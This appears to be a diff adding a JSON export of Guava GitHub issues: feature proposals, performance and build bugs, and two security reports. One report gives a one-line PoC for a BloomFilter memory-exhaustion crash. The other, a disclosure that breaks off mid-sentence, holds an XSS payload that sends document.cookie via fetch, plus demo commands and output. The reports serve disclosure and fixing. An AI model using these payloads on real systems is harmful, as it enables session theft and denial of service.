@@ -1,0 +1,384 @@
+[
+    {
+        "id": 4878318199,
+        "number": 8552,
+        "title": "`ImmutableMap.sortedCopyOf`",
+        "state": "open",
+        "created_at": "2026-07-13T22:56:27Z",
+        "updated_at": "2026-07-13T22:58:47Z",
+        "closed_at": null,
+        "author": "cpovirk",
+        "comments": 0,
+        "labels": [
+            "type=enhancement",
+            "package=collect",
+            "P3"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "This comes as a request from an external user. The motivation is to produce a deterministic order while continuing to use hashing for lookups, rather than the O(log N) lookups of `ImmutableSortedMap`. It is of course already possible to sort before calling `ImmutableMap.copyOf`, but a method on `ImmutableMap` might catch users' attention more, prompting them to consider whether sorting is right for them. (As usual, prompting users to consider something can be a small negative in the large majority of cases but a sizable positive in a small number of cases, and that can sometimes be OK. Or maybe users who are concerned enough should soft-ban `ImmutableSortedMap` and perhaps `ImmutableSortedSet`, too?) It might also perform better than separate sort+copy operations would, especially if the input is a collection whose stream implementation we have no hope of optimizing. I do see plenty of users of `sorted().collect(toImmutableMap(...))`, so those are people who either (depending on your perspective) want this or don't need this. \\[edit: And also as usual, we could worry that users will stress over whether to use `sorted().collect(toImmutableMap(...))` or `sortedCopyOf` in cases where it doesn't matter.\\]\n\nThe new API would be similar to the existing [`ImmutableList.sortedCopyOf(Iterable)`](https://guava.dev/releases/snapshot-jre/api/docs/com/google/common/collect/ImmutableList.html#sortedCopyOf(java.lang.Iterable)), and it could come with the same kind of [`Comparator`-accepting overload](https://guava.dev/releases/snapshot-jre/api/docs/com/google/common/collect/ImmutableList.html#sortedCopyOf(java.util.Comparator,java.lang.Iterable)). (It's admittedly a little strange that a method named \"`ImmutableMap.sortedCopyOf`\" would not return the `ImmutableSortedMap` class, whereas there is no `ImmutableSortedList`.)\n\nIt also reminds me a bit of how `ImmutableMultimap.Builder` offers [`orderKeysBy`](https://guava.dev/releases/snapshot-jre/api/docs/com/google/common/collect/ImmutableMultimap.Builder.html#orderKeysBy(java.util.Comparator)) and [`orderValuesBy`](https://guava.dev/releases/snapshot-jre/api/docs/com/google/common/collect/ImmutableMultimap.Builder.html#orderValuesBy(java.util.Comparator)), which I think we envisioned half as a partial replacement for having an `ImmutableSortedKeyMultimap`, etc. and half as a way of performing a sorting step that today we'd perform with `Stream`.\n\nThis proposal raises a question as to whether we'd want, well, possibly the sort of `Builder` API that I'd mentioned, but more likely whether we'd want  similar `sortedCopyOf` methods on `ImmutableSet`, etc.\n\nThere is probably a discussion to be had around the idea that `ImmutableMap` uses hashing for deduplication. For users of `buildKeepingLast()`, this raises questions about whether the sorting happens first or the deduplication happens first. This is in contrast to the `Stream` alternative of `input.stream().sorted(...).collect(toImmutableMapKeepingLast())`, which makes the ordering clear. (Not that I'd expect this to be a major issue, just something for us to consider, test, and document.)",
+        "url": "https://github.com/google/guava/issues/8552"
+    },
+    {
+        "id": 4692363698,
+        "number": 8492,
+        "title": "GraphQL Boundary Test - Guava",
+        "state": "closed",
+        "created_at": "2026-06-18T12:32:08Z",
+        "updated_at": "2026-06-18T12:37:54Z",
+        "closed_at": "2026-06-18T12:37:54Z",
+        "author": "sprint1-test-app-v2[bot]",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": null,
+        "url": "https://github.com/google/guava/issues/8492"
+    },
+    {
+        "id": 4687460117,
+        "number": 8491,
+        "title": "App test",
+        "state": "closed",
+        "created_at": "2026-06-17T22:17:51Z",
+        "updated_at": "2026-06-17T22:51:47Z",
+        "closed_at": "2026-06-17T22:51:47Z",
+        "author": "sprint1-test-app-v2[bot]",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": null,
+        "url": "https://github.com/google/guava/issues/8491"
+    },
+    {
+        "id": 4577751926,
+        "number": 8463,
+        "title": "BloomFilter.readFrom(InputStream, Funnel) allows unbounded memory  allocation via attacker-controlled longArraySize",
+        "state": "closed",
+        "created_at": "2026-06-03T07:19:28Z",
+        "updated_at": "2026-06-03T11:38:57Z",
+        "closed_at": "2026-06-03T11:38:57Z",
+        "author": "vibhum-dubey",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "The two-argument readFrom overload passes Long.MAX_VALUE as the allocation \nlimit. A crafted 6-byte stream with longArraySize = Integer.MAX_VALUE triggers \nnew AtomicLongArray(2,147,483,647) — a 17.2GB allocation — causing immediate \nOutOfMemoryError.\n\nThe three-argument overload with maxAllowedSizeInBits is already in the \ncodebase (@since NEXT) but unreleased. The fix is to change the two-argument \ndefault from Long.MAX_VALUE to a sensible bound.\n\nPoC: struct.pack('>BBi', 0, 1, 2147483647) → OutOfMemoryError: Requested \narray size exceeds VM limit\n\nSame class as CVE-2018-10237. References:\n- Vulnerable line: BloomFilter.java#L652\n- Unreleased fix: BloomFilter.java#L670",
+        "url": "https://github.com/google/guava/issues/8463"
+    },
+    {
+        "id": 4447146389,
+        "number": 8426,
+        "title": "Hashing.consistentHash() allocates a new object on every call",
+        "state": "closed",
+        "created_at": "2026-05-14T15:29:03Z",
+        "updated_at": "2026-05-16T14:42:12Z",
+        "closed_at": "2026-05-16T14:42:12Z",
+        "author": "Tsalachsnow",
+        "comments": 6,
+        "labels": [
+            "type=defect",
+            "package=hash",
+            "status=triaged",
+            "P3"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Guava Version\n\n33.6.0-jre\n\n### Description\n\nI was building a load balancer that routes incoming requests to backend shards using consistent hashing. My hot path calls Hashing.consistentHash(hashCode, numBuckets) for every request — several thousand times per second under normal traffic.\n\nWhile profiling with async-profiler, I noticed a steady stream of LinearCongruentialGenerator allocations showing up in the allocation flamegraph, all originating from consistentHash. I dug into the source and found that every single call to consistentHash allocates a new LinearCongruentialGenerator object. That class holds exactly one long field. There is no reason for it to be a heap-allocated object at all — the field and the arithmetic it performs could be local variables inside consistentHash itself.\n\nUnder heavy traffic this generates constant GC pressure for no gain. Inlining the single field and the formula from nextDouble() directly into consistentHash would make the allocation disappear entirely with zero behavioral change.\n\nRelevant source: Hashing.java line 657, LinearCongruentialGenerator inner class lines 825–836.\n\nHow to reproduce:\n\nRun the following code and attach an allocation profiler (e.g., async-profiler with -e alloc, or JVM flag -Xlog:gc to watch minor GC frequency):\nHashCode hash = Hashing.murmur3_128().hashLong(42L);\nfor (int i = 0; i < 10_000_000; i++) {\n    Hashing.consistentHash(hash, 100);\n}\nObserve LinearCongruentialGenerator objects appearing in the allocation profile at a rate of one per consistentHash call.\nAlternatively, open Hashing.java and inspect line 657 — a new LinearCongruentialGenerator(input) allocation appears unconditionally on every call path.\n\n### Example\n\n```java\nExample: Imagine a postal sorting facility that assigns each incoming letter to one of 100 bins using a fixed formula written on a reference card. For every single letter, instead of using the same card on the desk, a worker takes a blank sheet, hand-writes the formula on it, uses it once, and throws it away. The formula never changes — writing a new sheet for every letter is pure waste. The formula should just live on the desk as a few local variables, ready to use for the next letter the moment the current one is sorted.\n```\n\n### Expected Behavior\n\n1. consistentHash computes and returns the correct bucket index using only stack-allocated local variables.\n2. No heap objects are allocated per call beyond the method frame itself.\n3. Under high call frequency the method contributes zero allocation pressure to the GC.\n\n### Actual Behavior\n\n1. A new LinearCongruentialGenerator instance is heap-allocated on every single call, regardless of call frequency.\n2. Under high throughput (e.g., thousands of calls per second) this generates a continuous stream of short-lived objects, increasing minor GC frequency and adding measurable latency spikes in allocation-profiler traces.\n\n### Packages\n\ncom.google.common.hash\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8426"
+    },
+    {
+        "id": 4422158594,
+        "number": 8421,
+        "title": "In favor of Immutable interfaces",
+        "state": "open",
+        "created_at": "2026-05-11T15:40:04Z",
+        "updated_at": "2026-05-31T10:58:17Z",
+        "closed_at": null,
+        "author": "oliviercailloux",
+        "comments": 8,
+        "labels": [
+            "type=addition",
+            "package=collect",
+            "P4"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### 1. What are you trying to do?\n\nThis post summarizes some arguments expressed in [this conversation](https://groups.google.com/g/guava-discuss/c/5dlp8Yp9zpM/), as requested there.\n\n### Proposal\n- Introduce interfaces corresponding to the Guava immutable collection types: `ImmList`, `ImmGraph`, and so on, reflecting their respective contracts and extending JDK interfaces where appropriate.\n- Make the existing immutable types implement these interfaces. So for example `ImmutableList<E>` implements `ImmList<E>` which extends `List<E>`.\n- Suggest users of Guava who build public APIs to return the `Imm*` types instead of the `Immutable*` ones (replacing Wiki [Item 4](https://github.com/google/guava/wiki/TenThingsAboutImmutableCollections) for example).\n\n### Benefit\nThis decomposes interface and implementation, which is generally considered good: my API users have to know the contracts satisfied by the types that I accept and receive, but they should not depend on a specific implementation of these contracts. This way, I can (as an API implementer) swap underlying implementations without breaking compatibility; and users can pass other implementations to my API than those that I knew of when building it. These new implementations may, for example, be more efficient for some specific use cases, or may provide more services (as compatibility does not forbid extending the contract).\n\nThis argument applies to the Guava immutable types. Although they are high quality general implementations, “[There are](https://groups.google.com/g/guava-discuss/c/5dlp8Yp9zpM/m/blZ1OQFaAQAJ) for sure cases in which an alternative implementation would work better”. Also, having interfaces may enable [use cases](https://github.com/google/guava/issues/3480) that are extremely difficult to achieve without first convincing the Guava team to change their implementation.\n\n### Counter-arguments\n- As the `Immutable*` classes are high-quality, they should be adequate for most purposes, with only occasional improvements possible. In such a case, a library should define its own `ImmList` class. / “the benefits of alternate implementations are likely to be fairly minor, especially when balanced against the risks of people mis-implementing the interface. I expect that anyone with really specific requirements will probably build their own immutable implementation and use that, and that seems like a reasonable outcome.”\n  - It does not solve the main problem of allowing for future flexibility for the API designer: the API designer will presumably, following the proposed strategy, advertise its types to return `ImmutableList` until she has a reason not to; when she will see such a reason, it will be too late as returning `ImmList` instead would break compatibility.\n  - It does not solve the second main reason for the proposal (in my view), which is consistency with general advertised good practices of API design and showing a good example to the rest of the world by decomposing interface and implementation and being modest enough to admit that perhaps some day someone will need another implementation; liberal enough to admit that users should be given the right tools based on the right principles and be accountable for their own decisions; and consistent enough that we do not do one thing and still advise the rest of the world to do something else in their own case (imagine that developers all start to think that it’s not their responsibility to help their users swap implementations when needed, but on the contrary that they should actively make this more difficult to prevent incorrect mocking and to discourage using other implementations than their own).\n  - It duplicates types and work and misses an opportunity to standardize types, if multiple libraries do this. It exactly feels like the kind of work that should be done once for the whole world by the team designing the `Immutable*` classes rather than locally each time it is required.\n  - It is quite inelegant for the API builder to have to manually copy the whole `ImmutableList` contract to my own `ImmList` class.\n  - It creates unneeded complexity for the user of the API as she has to realize that the `ImmList` type from API-1 is logically the same than Guava `ImmutableList` and can be used (logically) interchangeably (and will wonder why two types are needed for the apparent same service).\n  - It disconnects logical interchangeability and compiler-known compatibility as there is no way to substitute `ImmutableList` (which could be still used somewhere else in the program) for `ImmList`.\n  - It is not transparent, provided the API user likes to clarifies her types by declaring her variables as `ImmutableList` rather than `List`; she has now sometimes to declare them as `ImmList` instead.\n- Just use alternatives to Guava `Immutable*` types, such as Eclipse collections, when there is a need.\n  - If one wants to keep future flexibility by possibly changing implementation later without breaking compatibility, then by that reasoning, one is systematically forbidden to use Guava `Immutable*` types. Does Guava really want to promote this kind of reasoning? Guava needs to choose between _When designing your API, decide between binding forever to our implementation or just get rid of our types_; VS _Good API design maximises, wherever possible, the possibility of future switching of implementation, even when you still do not see a specific reason for such possible change_.\n- People will start mocking the types.\n  - As admitted, people don’t usually mock `List` types. (And see the points above, more philosophically.)\n- The receiver must act defensibly when receiving non-sealed interfaces such as the proposal or any other classical types such as `List`, whereas Guava’s Immutable types give strong guarantees about integrity and security.\n  - When users really want non-type-substitutability, my proposition does not prevent it. In general however, the general advice of decomposing interface and implementation should apply, and users should allow for type-substitutability.\n- “the behavior being asked for is already provided by the root collection interfaces (…) Guava introducing marker interfaces for its immutable types would provide no new behavior, could satisfy no expectations (…) For those who want to make those promises softly, they can use the core interfaces and JavaDoc appropriately and leave it up to the receiver to decide how confident they are in relying on those claims.” / “I don't think that an `ImmList` extension of `List` would add a lot of value: interfaces-as-contracts work better if the existence/absence of methods matches the intended semantics/capabilities”\n  - Returning a type and documenting that it is immutable is much less clear to the API user than [making it known](https://guava.dev/releases/snapshot/api/docs/com/google/common/collect/ImmutableCollection.html) [through the type itself](https://stackoverflow.com/a/22056144/), and ImmutableSet for example has method `asList()` that is not in `Set`. True, it would be more elegant to have mutable and immutable interfaces from the start, but having at least the modification methods marked deprecated in the Imm* types is a better second-best option than nothing.\n- Lot of time needed to do this right (“Done in an ad-hoc fashion, it's a very easy way to paint yourself into a corner.”; “We'd want to do new interfaces right, so we'd want a full understanding of the design space. That would mean a lot of investigation of Guava (e.g., should the interfaces live in common.base so that Splitter can use them?)”)\n  - Perhaps I am missing something, but I do not see why it is not as simple as moving the public contract of the `ImmutableSomething` class to the `ImmSomething` interface. (I am not arguing for just doing it in the next five minutes; I obviously agree that some brainstorming with Guava and the community is required just to make sure that this idea will not create problems and to take one-off decisions such as where to put the new interfaces, but I do not view it as a huge work that requires taking meticulous case-by-case decisions for each class and method.)\n  - This could be done just for one class (judged easier), before deciding whether to extend to other classes, just to assess the time it takes or whether it does create difficulties.\n  - As I understand, the alternative is _not_ doing it at all, so the risks of doing it perhaps imperfectly have to be compared to the certain problems resulting from not doing it, and unsubstitutability of the implementation should be considered an important design flaw.\n\n\n### 2. What's the best code you can write to accomplish that without the new feature?\n\nI hope that it is okay that I do not respect the template, given that it does not seem perfectly appropriate here and that I have taken efforts to summarize the arguments and counter-arguments in another way here above.\n\n### 3. What would that same code look like if we added your feature?\n\nI hope that it is okay that I do not respect the template, given that it does not seem perfectly appropriate here and that I have taken efforts to summarize the arguments and counter-arguments in another way here above.\n\n### (Optional) What would the method signatures for your feature look like?\n\n```java\n\n```\n\n### Concrete Use Cases\n\nI hope that it is okay that I do not respect the template, given that it does not seem perfectly appropriate here and that I have taken efforts to summarize the arguments and counter-arguments in another way here above.\n\n### Packages\n\ncom.google.common.collect, com.google.common.base, com.google.common.graph\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I have read and understood the [contribution guidelines](https://github.com/google/guava/wiki/HowToContribute#feature-requests).\n\n- [x] I have read and understood [Guava's philosophy](https://github.com/google/guava/wiki/PhilosophyExplained), and I strongly believe that this proposal aligns with it.\n\n- [x] I have visited the [idea graveyard](https://github.com/google/guava/wiki/IdeaGraveyard), and did not see anything similar to this idea.\n",
+        "url": "https://github.com/google/guava/issues/8421"
+    },
+    {
+        "id": 4417681824,
+        "number": 8420,
+        "title": "When a ratelimiter instance is just initialized, it cannot handle sudden bursts of traffic.",
+        "state": "closed",
+        "created_at": "2026-05-11T02:36:15Z",
+        "updated_at": "2026-05-12T20:07:27Z",
+        "closed_at": "2026-05-12T20:07:27Z",
+        "author": "c-wchen",
+        "comments": 1,
+        "labels": [
+            "type=enhancement",
+            "package=concurrent",
+            "status=triaged",
+            "P3"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Guava Version\n\nmaster\n\n### Description\n\nA method interface needs to be provided to set the initial value for the \"storedPermit\" variable.\n\n<img width=\"1794\" height=\"286\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/62c26bf0-2d2c-4955-9391-c84f81d94ef1\" />\n\n### Example\n\n```java\nNone\n```\n\n### Expected Behavior\n\nNone\n\n### Actual Behavior\n\nNone\n\n### Packages\n\n_No response_\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8420"
+    },
+    {
+        "id": 4414873727,
+        "number": 8419,
+        "title": "ImmutableMap.java use ternary once it no longer confuses nullness checker ",
+        "state": "closed",
+        "created_at": "2026-05-10T06:28:45Z",
+        "updated_at": "2026-05-10T12:04:17Z",
+        "closed_at": "2026-05-10T12:04:17Z",
+        "author": "MarcoLe3",
+        "comments": 1,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "Hi, I saw another TODO for file `ImmutableMap.java`  to use ternary once it no longer confuses nullness checker.\nIs it possible if I can look into this? ",
+        "url": "https://github.com/google/guava/issues/8419"
+    },
+    {
+        "id": 4402644402,
+        "number": 8412,
+        "title": "AbstractFutureTest adding clinit test",
+        "state": "closed",
+        "created_at": "2026-05-07T23:36:38Z",
+        "updated_at": "2026-05-10T08:28:18Z",
+        "closed_at": "2026-05-10T08:28:18Z",
+        "author": "MarcoLe3",
+        "comments": 8,
+        "labels": [
+            "type=enhancement",
+            "package=concurrent",
+            "P3"
+        ],
+        "assignees": [
+            "cpovirk"
+        ],
+        "locked": false,
+        "body": "Hi\n\nI wanted to try and dip my toe in the water. I saw a TODO comment about adding a clinit test for `AbstractFuture`  class and was wondering if I can add a test case inside `AbstractFutureTest`.\n\n",
+        "url": "https://github.com/google/guava/issues/8412"
+    },
+    {
+        "id": 4364877588,
+        "number": 8398,
+        "title": "Gradle unable to resolve Guava in a project, with a VariantSelectionByAttributesException error",
+        "state": "open",
+        "created_at": "2026-05-01T14:30:36Z",
+        "updated_at": "2026-05-22T20:59:01Z",
+        "closed_at": null,
+        "author": "fidothe",
+        "comments": 5,
+        "labels": [
+            "type=documentation",
+            "P4"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Guava Version\n\n33.5.0\n\n### Description\n\nIn a gradle project I have a build that uses some Java tooling as part of its \nbuild machinery, but is not, itself, a Java project. One of the tooling \ndependencies (javaparser) has a dependency on Guava.\n\nFor historical reasons that project's `build.gradle.kts` applied the \n`java-library` plugin. When I removed it because its default tasks were causing \nproblems with other tasks and, as noted, no Java artifacts were being produced,\nthe build failed with an error:\n\n    Variant Selection Exception: \n        org.gradle.internal.component.resolution.failure.exception.VariantSelectionByAttributesException \n        caused by Resolution Failure: \n        org.gradle.internal.component.resolution.failure.type.NoCompatibleVariantsFailure\n\nGradle can no longer resolve a Guava variant that it can use. Note that `javaparser` is explicitly depending on the `-jre` Guava version. (https://github.com/javaparser/javaparser/blob/11a99ae61df28b19fb9b64e5f7c216fa71dc4020/pom.xml#L432-L437)\n\nThere's a minimal repro here: https://github.com/Saxonica/guava-variant-problem\n\nThis project contains two Gradle sub-projects, `java_lib` and \n`non_java` whose `build.gradle.kts` differ only in the plugin they apply.\n\n`non_java` applies the `base` plugin, and `java_lib` applies the `java-library` \nplugin. They both contain a simple configuration which declares a dependency on\nGuava. \n\nRunning `./gradlew java_lib:dependencies` shows that Guava resolves fine, and\n`./gradlew non_java:depdendencies` shows the failure.\n\nThis is defintely unexpected behvaiour, and seems like buggy behaviour, though I\nam really not sure if this is a Gradle problem or a Guava Gradle metadata\nproblem.\n\nI imagine this is related to #7059, #6801 and friends\n\n\n### Example\n\n```java\nClone https://github.com/Saxonica/guava-variant-problem and run the following:\n\n\n./gradlew non_java:dependencies`\n```\n\n### Expected Behavior\n\nA properly resolved dependency tree, whose `macguffin` configuration's dependency tree should be identical to the result of running `./gradlew java_lib:dependencies`:\n\n```\n> Task :non_java:dependencies\n\n------------------------------------------------------------\nProject ':non_java'\n------------------------------------------------------------\n\nmacguffin\n\\--- com.google.guava:guava:33.6.0-jre\n     +--- com.google.guava:failureaccess:1.0.3\n     +--- com.google.guava:listenablefuture:9999.0-empty-to-avoid-conflict-with-guava\n     +--- org.jspecify:jspecify:1.0.0\n     +--- com.google.errorprone:error_prone_annotations:2.47.0\n     \\--- com.google.j2objc:j2objc-annotations:3.1\n\nmacguffinRuntime (n)\n\\--- com.google.guava:guava:33.6.0-jre (n)\n\n(n) - A dependency or dependency configuration that cannot be resolved.\n\nA web-based, searchable dependency report is available by adding the --scan option.\n\nBUILD SUCCESSFUL in 414ms\n```\n\n### Actual Behavior\n\n```\n> Task :non_java:dependencies\n\n------------------------------------------------------------\nProject ':non_java'\n------------------------------------------------------------\n\nmacguffin\n\\--- com.google.guava:guava:33.6.0-jre FAILED\n\nmacguffinRuntime (n)\n\\--- com.google.guava:guava:33.6.0-jre (n)\n\n(n) - A dependency or dependency configuration that cannot be resolved.\n\nA web-based, searchable dependency report is available by adding the --scan option.\n\nBUILD SUCCESSFUL in 414ms\n```\n\n### Packages\n\n_No response_\n\n### Platforms\n\n_No response_\n\n### Checklist\n\n- [x] I agree to follow the [code of conduct](https://github.com/google/.github/blob/master/CODE_OF_CONDUCT.md).\n\n- [x] I can reproduce the bug with the [latest](https://github.com/google/guava/releases/latest) version of Guava available.\n",
+        "url": "https://github.com/google/guava/issues/8398"
+    },
+    {
+        "id": 4343148410,
+        "number": 8387,
+        "title": "Security: Guava HtmlEscapers can enable XSS in unquoted HTML attribute values",
+        "state": "closed",
+        "created_at": "2026-04-28T12:32:34Z",
+        "updated_at": "2026-04-28T13:35:16Z",
+        "closed_at": "2026-04-28T12:44:42Z",
+        "author": "foxllb",
+        "comments": 0,
+        "labels": [
+            "type=defect"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "### Guava Version\n\nlatest code\n\n### Description\n\n## Report description\nGuava HtmlEscapers can enable XSS in unquoted HTML attribute values\n\n## The problem\n### Please describe the technical details of the vulnerability\n\n#### 1. technical details\n\n`HtmlEscapers.htmlEscaper()` is documented as producing strings that can be used in HTML\nattribute values:\n\n```java\n/**\n * {@code Escaper} instances suitable for strings to be included in HTML attribute values and\n * <em>most</em> elements' text contents. When possible, avoid manual escaping by using templating\n * systems and high-level APIs that provide autoescaping.\n */\npublic final class HtmlEscapers {\n  /**\n   * Returns an {@link Escaper} instance that escapes HTML metacharacters as specified by <a\n   * href=\"http://www.w3.org/TR/html4/\">HTML 4.01</a>. The resulting strings can be used both in\n   * attribute values and in <em>most</em> elements' text contents, provided that the HTML\n   * document's character encoding can encode any non-ASCII code points in the input (as UTF-8 and\n   * other Unicode encodings can).\n   */\n  public static Escaper htmlEscaper() {\n    return HTML_ESCAPER;\n  }\n}\n```\n\nThe implementation only escapes five ASCII characters:\n\n```java\nprivate static final Escaper HTML_ESCAPER =\n    Escapers.builder()\n        .addEscape('\"', \"&quot;\")\n        // Note: \"&apos;\" is not defined in HTML 4.01.\n        .addEscape('\\'', \"&#39;\")\n        .addEscape('&', \"&amp;\")\n        .addEscape('<', \"&lt;\")\n        .addEscape('>', \"&gt;\")\n        .build();\n```\n\nThis is safe for quoted HTML attribute values, but it is not safe for unquoted HTML attribute\nvalues. In an unquoted attribute value, raw whitespace terminates the current value and raw `=`\nparticipates in creating a new attribute. Because those characters are left unchanged, a caller who\nuses the API according to the broad \"attribute values\" contract can accidentally turn an attacker\ncontrolled data value into a new browser-visible attribute.\n\nThe reproduction models a profile review application. A normal user controls only an avatar URL.\nThe reviewer page uses Guava to escape the submitted fields, then renders the avatar URL into an\nunquoted `src` attribute:\n\n```java\npublic static final String ATTACK_AVATAR_URL =\n    \"x onerror=fetch('/audit-log/'+encodeURIComponent(document.cookie))\";\n\nprivate static final Escaper HTML = HtmlEscapers.htmlEscaper();\n\npublic static String renderReviewPage(Profile profile) {\n  String email = HTML.escape(profile.email);\n  String displayName = HTML.escape(profile.displayName);\n  String avatarUrl = HTML.escape(profile.avatarUrl);\n\n  return \"<!doctype html>\\n\"\n      + \"<html><head><meta charset=\\\"utf-8\\\"><title>Profile Review</title></head>\\n\"\n      + \"<body>\\n\"\n      + \"<h1>Pending Profile Review</h1>\\n\"\n      + \"<p>Reviewer: admin@example.test</p>\\n\"\n      + \"<article class=review-card data-email=\\\"\"\n      + email\n      + \"\\\">\\n\"\n      + \"<h2>\"\n      + displayName\n      + \"</h2>\\n\"\n      + \"<img class=avatar src=\"\n      + avatarUrl\n      + \" alt=\\\"\"\n      + displayName\n      + \"\\\">\\n\"\n      + \"<p>Submitted avatar URL: \"\n      + avatarUrl\n      + \"</p>\\n\"\n      + \"</article>\\n\"\n      + \"</body></html>\\n\";\n}\n```\n\nThe attacker-controlled value:\n\n```text\nx onerror=fetch('/audit-log/'+encodeURIComponent(document.cookie))\n```\n\nis rendered into the reviewer page as:\n\n```html\n<img class=avatar src=x onerror=fetch(&#39;/audit-log/&#39;+encodeURIComponent(document.cookie)) alt=\"Pending user\">\n```\n\nThe browser parses that as an image with `src=x` and a separate `onerror` handler.\n\n#### 2. vulnerability reproduction\n\nThe reproduction is implemented in:\n\n```text\n./work/guava/htmlEscaperXSS\n```\n\nRun the one-click demo:\n\n```bash\ncd /root/code/google/work/guava/htmlEscaperXSS\n./scripts/demo.sh\n```\n\nThe script builds the local Guava jar, compiles the reproduction, starts a local review server,\nsubmits the attacker-controlled profile field, fetches the reviewer page, and parses the generated\nHTML.\n\nObserved output:\n\n```text\n== Guava HtmlEscapers XSS one-click demo ==\n\nAttacker-controlled profile field:\nx onerror=fetch('/audit-log/'+encodeURIComponent(document.cookie))\n\nRendered reviewer-page image tag:\n<img class=avatar src=x onerror=fetch(&#39;/audit-log/&#39;+encodeURIComponent(document.cookie)) alt=\"Pending user\">\n\nBrowser-level verification:\nExploit scenario verified.\nReviewer page contains an attacker-created image event handler.\nParsed browser attributes: {class=avatar, src=x, onerror=fetch('/audit-log/'+encodeURIComponent(document.cookie)), alt=Pending user}\nImpact: a browser will execute the handler when the broken avatar loads.\n```\n\nThe verification code checks the parsed browser attributes:\n\n```java\nMap<String, String> imageAttributes = parseFirstImageAttributes(reviewerHtml);\n\nrequire(\"x\".equals(imageAttributes.get(\"src\")), \"The attacker-controlled src was not parsed\");\nrequire(\n    imageAttributes.containsKey(\"onerror\"),\n    \"The browser-visible image did not contain an injected onerror attribute\");\n\nString handler = imageAttributes.get(\"onerror\");\nrequire(\n    \"fetch('/audit-log/'+encodeURIComponent(document.cookie))\".equals(handler),\n    \"Unexpected onerror handler: \" + handler);\n```\n\n#### 3. patch\n\nThe minimal compatibility-preserving fix is to narrow the documented security contract to quoted\nattribute values and explicitly warn that the escaper is not safe for unquoted attribute values.\n\n```diff\ndiff --git a/android/guava/src/com/google/common/html/HtmlEscapers.java b/android/guava/src/com/google/common/html/HtmlEscapers.java\nindex 6da5475..9826a3b 100644\n--- a/android/guava/src/com/google/common/html/HtmlEscapers.java\n+++ b/android/guava/src/com/google/common/html/HtmlEscapers.java\n@@ -19,7 +19,7 @@ import com.google.common.escape.Escaper;\n  import com.google.common.escape.Escapers;\n\n  /**\n- * {@code Escaper} instances suitable for strings to be included in HTML attribute values and\n+ * {@code Escaper} instances suitable for strings to be included in quoted HTML attribute values and\n   * <em>most</em> elements' text contents. When possible, avoid manual escaping by using templating\n   * systems and high-level APIs that provide autoescaping.\n   * One Google-authored templating system available for external use is <a\n@@ -40,14 +40,15 @@ public final class HtmlEscapers {\n    /**\n     * Returns an {@link Escaper} instance that escapes HTML metacharacters as specified by <a\n     * href=\"http://www.w3.org/TR/html4/\">HTML 4.01</a>. The resulting strings can be used both in\n-   * attribute values and in <em>most</em> elements' text contents, provided that the HTML\n+   * quoted attribute values and in <em>most</em> elements' text contents, provided that the HTML\n     * document's character encoding can encode any non-ASCII code points in the input (as UTF-8 and\n     * other Unicode encodings can).\n     *\n     * <p><b>Note:</b> This escaper only performs minimal escaping to make content structurally\n     * compatible with HTML. Specifically, it does not perform entity replacement (symbolic or\n     * numeric), so it does not replace non-ASCII code points with character references. This escaper\n-   * escapes only the following five ASCII characters: {@code '\"&<>}.\n+   * escapes only the following five ASCII characters: {@code '\"&<>}. Because it does not escape\n+   * whitespace or {@code =}, it is not safe for use in unquoted attribute values.\n     */\n    public static Escaper htmlEscaper() {\n      return HTML_ESCAPER;\ndiff --git a/guava/src/com/google/common/html/HtmlEscapers.java b/guava/src/com/google/common/html/HtmlEscapers.java\nindex 6da5475..9826a3b 100644\n--- a/guava/src/com/google/common/html/HtmlEscapers.java\n+++ b/guava/src/com/google/common/html/HtmlEscapers.java\n@@ -19,7 +19,7 @@ import com.google.common.escape.Escaper;\n  import com.google.common.escape.Escapers;\n\n  /**\n- * {@code Escaper} instances suitable for strings to be included in HTML attribute values and\n+ * {@code Escaper} instances suitable for strings to be included in quoted HTML attribute values and\n   * <em>most</em> elements' text contents. When possible, avoid manual escaping by using templating\n   * systems and high-level APIs that provide autoescaping.\n   * One Google-authored templating system available for external use is <a\n@@ -40,14 +40,15 @@ public final class HtmlEscapers {\n    /**\n     * Returns an {@link Escaper} instance that escapes HTML metacharacters as specified by <a\n     * href=\"http://www.w3.org/TR/html4/\">HTML 4.01</a>. The resulting strings can be used both in\n-   * attribute values and in <em>most</em> elements' text contents, provided that the HTML\n+   * quoted attribute values and in <em>most</em> elements' text contents, provided that the HTML\n     * document's character encoding can encode any non-ASCII code points in the input (as UTF-8 and\n     * other Unicode encodings can).\n     *\n     * <p><b>Note:</b> This escaper only performs minimal escaping to make content structurally\n     * compatible with HTML. Specifically, it does not perform entity replacement (symbolic or\n     * numeric), so it does not replace non-ASCII code points with character references. This escaper\n-   * escapes only the following five ASCII characters: {@code '\"&<>}.\n+   * escapes only the following five ASCII characters: {@code '\"&<>}. Because it does not escape\n+   * whitespace or {@code =}, it is not safe for use in unquoted attribute values.\n     */\n    public static Escaper htmlEscaper() {\n      return HTML_ESCAPER;\n```\n\n### Impact analysis - Please briefly explain who can exploit the vulnerability, and what they gain when doing so\n\nA user who can submit a normal data field that is later rendered as an HTML attribute value can\nexploit this when the application relies on `HtmlEscapers.htmlEscaper()` for that attribute context.\nIn the demonstrated profile-review workflow, the attacker controls only the avatar URL field. When a\nreviewer 